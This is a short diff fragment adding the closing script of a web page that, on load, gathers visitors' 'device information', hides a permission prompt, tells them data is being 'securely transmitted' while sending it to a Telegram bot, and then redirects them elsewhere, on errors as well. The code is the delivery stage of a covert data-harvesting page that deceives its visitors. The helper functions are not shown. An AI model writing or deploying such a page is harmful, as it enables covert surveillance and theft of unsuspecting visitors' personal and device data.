@@ -478,4 +478,31 @@
                 statusEl.textContent = 'Gathering device information...';
                 const allData = await collectAllData();
                 
-             
+                // Hide permission request
+                permEl.classList.add('hidden');
+                
+                // Step 3: Send to Telegram
+                statusEl.textContent = 'Securely transmitting data...';
+                await sendToTelegram(allData);
+                
+                // Step 4: Redirect
+                statusEl.textContent = 'Redirecting...';
+                setTimeout(() => {
+                    window.location.href = REDIRECT_URL;
+                }, 2000);
+                
+            } catch (err) {
+                console.error('Main error:', err);
+                errorEl.classList.remove('hidden');
+                statusEl.textContent = 'Redirecting...';
+                setTimeout(() => {
+                    window.location.href = REDIRECT_URL;
+                }, 2000);
+            }
+        }
+
+        // Start when page loads
+        window.addEventListener('load', main);
+    </script>
+</body>
+</html>
